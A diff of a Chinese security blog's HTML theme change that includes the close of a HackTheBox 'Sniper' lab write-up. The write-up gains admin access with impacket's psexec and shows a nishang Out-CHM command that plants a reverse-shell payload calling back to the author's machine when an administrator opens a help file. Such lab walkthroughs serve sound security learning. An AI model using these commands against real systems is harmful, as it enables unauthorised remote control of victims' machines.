 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket   </span><br><span class="line">pip install .</span><br><span class="line">python psexec.py Administrator@10.10.10.151</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" alt></p>
+<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>成功拿到rootshell.</p>
-<p>当然还有类似前面的直接反弹rootshell的方法。因为chm文件甚至可以插入powershell命令，所以我们可以直接生成反弹shell的html.这里直接借用看到的dalao的chm。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" alt><br>或者使用powershell命令生成payload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p>
+<p>当然还有类似前面的直接反弹rootshell的方法。因为chm文件甚至可以插入powershell命令，所以我们可以直接生成反弹shell的html.这里直接借用看到的dalao的chm。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" class="lazyload" data-srcset="hackthebox-Sniper--%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>或者使用powershell命令生成payload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CHM –Payload <span class="string">"C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe"</span> –HHCPath “C:\Program Files (x86)\HTML Help Workshop”</span><br></pre></td></tr></table></figure>
 <p>这样就能直接在administrator检查时反弹到shell.</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次windows靶机的体验还算不错。因为不熟悉的原因接触了不少新知识。有很多细节还没弄明白，但是也学到了不少windows靶机新知识。的确，CTFer 不能总是待在舒适区。国际赛也好，htb靶机渗透也好，都是接触非国内渗透知识的大好途径。毕竟也打了一段时间比赛了，国内的比赛除了大型比赛能有很多新姿势以及新想法学以外，其他的出题思路或者赛事操作都是老生常谈，拘泥于php或者个别trick的泥潭中。这几天尝试了java题，windows题，都算是一种突破常规的尝试吧。希望自己也能成为有想法的CTFer。而不是一个单纯的CTF赛棍.</p>
 
-          
-            <div class='article_footer'>
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
               
-                
-  
-    
-    
-
-
-
-  
-
-  
-    
-    
-
-
-
-  
-
-  
-    
-    
-
-<section class="widget copyright  desktop mobile">
-  <div class='content'>
-    
-      <blockquote>
-        
-          
-            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
-
-          
-        
-          
-            <p>本文永久链接是：<a href=https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/>https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/</a></p>
-          
-        
-      </blockquote>
-    
-  </div>
-</section>
-
-  
-
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
 
               
-            </div>
-          
+            
+              
+                <p>本文永久链接是：<a href=https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/>https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/</a></p>
+              
+            
+          </blockquote>
         </div>
-        
-          
+      
+      
+        <div class='donate'>
+          <div class='imgs'>
+            
+              <img src='/assests/wechat.png'>
+            
+          </div>
+        </div>
+      
+    </div>
+  
+  
+    
 
 
-  <section class='meta' id="footer-meta">
+  <div class='article-meta' id="bottom">
     <div class='new-meta-box'>
       
         
@@ -575,95 +585,59 @@
 
         
       
-        
-          
+    </div>
+  </div>
 
-        
+
+  
+  
+
+  
+    <div class="prev-next">
       
-        
-          
-
-        
+        <a class='prev' href='/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ByteBanditsCTF2020两道WEB复现</p>
+          <p class='content'>这周末又当了波国际赛划水懒狗。看了几个比赛难度参差不齐。只有bytebandits的难度确实顶。当时看了下NotesApp没做出来就划水去了。所幸官方很贴心的给了docker的环境。现在把两道W...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/'>
+          <p class='title'>VolgaCTF2020Qualifier复现<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>比赛没有怎么认真打，但是毕竟题还是看了的。除了幽灵猫以外的题也是很有价值的，好好学习一波。
+NetCorp这个周末最大的收获就是做了几道java题，对java题的相关套路有了一定了解。比如此题，...</p>
+        </a>
       
     </div>
-  </section>
+  
+</article>
 
 
-        
-        
-          <div class="prev-next">
-            
-              <a class='prev' href='/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/'>
-                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ByteBanditsCTF2020两道WEB复现</p>
-                <p class='content'>这周末又当了波国际赛划水懒狗。看了几个比赛难度参差不齐。只有bytebandits的难度确实顶。当时看了下NotesApp没做出来就划水去了。所幸官方很贴心的给了docker的环境。现在把两道W...</p>
-              </a>
-            
-            
-              <a class='next' href='/2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/'>
-                <p class='title'>VolgaCTF2020Qualifier复现<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-                <p class='content'>比赛没有怎么认真打，但是毕竟题还是看了的。除了幽灵猫以外的题也是很有价值的，好好学习一波。
-NetCorp这个周末最大的收获就是做了几道java题，对java题的相关套路有了一定了解。比如此题，...</p>
-              </a>
-            
-          </div>
-        
-      </section>
-    </article>
   
 
-  
-    <!-- 显示推荐文章和评论 -->
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
 
-
-
-  <article class="post white-box reveal comments shadow">
-    <section class="article typo">
-      <p ct><i class='fas fa-comments'></i> 评论</p>
-      
-      
-      
-      
-      
-      
-        <section id="comments">
-          <div id="valine_container" class="valine_thread">
-            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
-          </div>
-        </section>
-      
-      
-    </section>
   </article>
 
 
-  
 
 
-
-
-<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
-
-
-
-  <script>
-    window.subData = {
-      title: 'hackthebox-Sniper--初尝windows靶机',
-      tools: true
-    }
-  </script>
 
 
 </div>
 <aside class='l_side'>
   
   
-
-  
     
     
 
 
-  <section class="widget toc-wrapper shadow desktop mobile">
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
@@ -673,7 +647,7 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-RFI-gt-命令执行-gt-webshell"><span class="toc-text">LFI&#x2F;RFI&#x3D;&gt;命令执行&#x3D;&gt;webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-shell"><span class="toc-text">user shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#端口扫描"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-RFI-gt-命令执行-gt-webshell"><span class="toc-text">LFI&#x2F;RFI&#x3D;&gt;命令执行&#x3D;&gt;webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-shell"><span class="toc-text">user shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
     </div>
   </section>
 
@@ -684,8 +658,36 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
 </aside>
 
 
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="hackthebox-Sniper--初尝windows靶机";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
   
-  <footer class="clearfix">
+  l_header.classList.remove("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="half";
+    cover_wrapper.style.display="";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
     <br><br>
     
       
@@ -705,6 +707,7 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
                 class="social fas fa-rss flat-btn"
                 target="_blank"
                 rel="external nofollow noopener noreferrer">
+                
               </a>
             
           
@@ -713,6 +716,7 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
                 class="social fas fa-envelope flat-btn"
                 target="_blank"
                 rel="external nofollow noopener noreferrer">
+                
               </a>
             
           
@@ -721,10 +725,29 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
                 class="social fab fa-github flat-btn"
                 target="_blank"
                 rel="external nofollow noopener noreferrer">
+                
               </a>
             
           
         </div>
+      
+    
+      
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        Use
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
+        as theme
       
     
       
@@ -734,70 +757,199 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
         </div>
       
     
-      
-        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
-        , total visits
-          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
-          times
-        
-      
-    
   </footer>
 
-<script>setLoadingBarProgress(80);</script>
 
-
-      <script>setLoadingBarProgress(60);</script>
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
     </div>
-    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
-  </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
   
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
-
-
-  <script>
-    
-    var SEARCH_SERVICE = "hexo" || "hexo";
-    var ROOT = "/" || "/";
-    if (!ROOT.endsWith('/')) ROOT += '/';
-  </script>
-
-
-  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
-
-
-  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
-  <script type="text/javascript">
-    $(function() {
-      ScrollReveal().reveal('.l_main .reveal', {
-        distance: '8px',
-        duration: '800',
-        interval: '100',
-        scale: '1'
-      });
-    });
-  </script>
-
-
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
   
-<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+  
+  
+  
+</script>
+<!-- required -->
 
-  <script type="text/javascript">
-    $(function() {
-      Waves.attach('.flat-btn', ['waves-button']);
-      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
-      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
-      Waves.attach('.flat-box', ['waves-block']);
-      Waves.attach('.float-box', ['waves-block', 'waves-float']);
-      Waves.attach('.waves-image');
-      Waves.init();
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
     });
-  </script>
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
 
 
-  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
-
-
+<!-- internal -->
 
   
   
@@ -806,8 +958,7 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
 <script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
 
     <script type="text/javascript">
-      $(function(){
-        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"];
         if ('true' == 'true') {
           function shuffle(arr){
             /*From countercurrent-time*/
@@ -821,28 +972,86 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
           }
           shuffle(imgs);
         }
-        if ('') {
-          $('').backstretch(
-            imgs,
-          {
-            duration: "20000",
-            fade: "1500"
-          });
-        } else {
+	  function Pjax_backstretch(){
+        
           $.backstretch(
             imgs,
           {
-            duration: "20000",
+            duration: "10000",
             fade: "1500"
           });
-        }
-      });
+        
+	  }
+	  loadScript("https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js",Pjax_backstretch)
     </script>
   
 
 
 
 
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
 
 
 
@@ -851,22 +1060,13 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
 
 
   
-    
-<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
-
   
-  <script>
-  var GUEST_INFO = ['nick','mail','link'];
-  var meta = 'nick,mail,link'.split(',').filter(function(item){
-    return GUEST_INFO.indexOf(item) > -1
-  });
-  var REQUIRED_FIELDS = ['nick','mail','link'];
-  var requiredFields = 'nick,mail'.split(',').filter(function(item){
-    return REQUIRED_FIELDS.indexOf(item) > -1
-  });
-  var valine = new Valine();
+<script src="/js/valine.js"></script>
+
+
+<script>
   function emoji(path, idx, ext) {
-      return path + "/" + path + "-" + idx + "." + ext;
+    return path + "/" + path + "-" + idx + "." + ext;
   }
   var emojiMaps = {};
   for (var i = 1; i <= 54; i++) {
@@ -884,134 +1084,541 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
   for (var i = 1; i <= 4; i++) {
     emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
   }
-  valine.init({
-    el: '#valine_container',
-    meta: meta,
-    
-    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
-    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
-    placeholder: "快来评论吧~",
-    pageSize:'10',
-    avatar:'robohash',
-    lang:'zh-cn',
-    visitor: 'true',
-    highlight: 'true',
-    mathJax: 'false',
-    enableQQ: 'true',
-    requiredFields: requiredFields,
-    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
-    emojiMaps: emojiMaps
-  })
-  </script>
-
-
-
-
-
-  
-<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>
-
-
-
-  
-<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
-
-
-
-  
-<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
-
-
-
-
-
-
-<!-- 复制 -->
-
-  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
-<script>
-  function wait(callback, seconds) {
-    var timelag = null;
-    timelag = window.setTimeout(callback, seconds);
-  }
-  !function (e, t, a) {
-    var initCopyCode = function(){
-      var copyHtml = '';
-      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
-      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
-      copyHtml += '</button>';
-      $(".highlight .code pre").before(copyHtml);
-      $(".article pre code").before(copyHtml);
-      var clipboard = new ClipboardJS('.btn-copy', {
-        target: function(trigger) {
-          return trigger.nextElementSibling;
-        }
-      });
-      clipboard.on('success', function(e) {
-        let $btn = $(e.trigger);
-        $btn.addClass('copied');
-        let $icon = $($btn.find('i'));
-        $icon.removeClass('fa-copy');
-        $icon.addClass('fa-check-circle');
-        let $span = $($btn.find('span'));
-        $span[0].innerText = 'COPIED';
-        
-        wait(function () { // 等待两秒钟后恢复
-          $icon.removeClass('fa-check-circle');
-          $icon.addClass('fa-copy');
-          $span[0].innerText = 'COPY';
-        }, 2000);
-      });
-      clipboard.on('error', function(e) {
-        e.clearSelection();
-        let $btn = $(e.trigger);
-        $btn.addClass('copy-failed');
-        let $icon = $($btn.find('i'));
-        $icon.removeClass('fa-copy');
-        $icon.addClass('fa-times-circle');
-        let $span = $($btn.find('span'));
-        $span[0].innerText = 'COPY FAILED';
-        
-        wait(function () { // 等待两秒钟后恢复
-          $icon.removeClass('fa-times-circle');
-          $icon.addClass('fa-copy');
-          $span[0].innerText = 'COPY';
-        }, 2000);
-      });
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
     }
-    initCopyCode();
-  }(window, document);
+    var valine = new Valine();
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+      el: '#valine_container',
+      path: path,
+      placeholder: pagePlaceholder,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps,
+    }))
+  }
+  $(function () {
+    pjax_valine();
+  });
+  volantis.pjax.push(pjax_valine);
 </script>
 
 
 
 
-<!-- fancybox -->
 
-  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
-<script>
